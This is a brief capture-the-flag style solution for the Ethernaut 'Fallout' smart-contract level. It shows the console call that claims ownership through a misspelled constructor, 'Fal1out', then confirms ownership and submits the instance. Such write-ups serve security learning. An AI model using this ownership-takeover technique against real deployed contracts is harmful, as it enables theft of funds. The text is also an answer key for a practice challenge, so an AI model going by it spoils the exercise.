## Fallout Solution

1. Constructor method has different name from the contract.  
`await contract.Fal1out({value: toWei(0)});`  

2. Check if player is contract owner.  
`player === await contract.owner()`  
true

3. Submit Instance 🎉
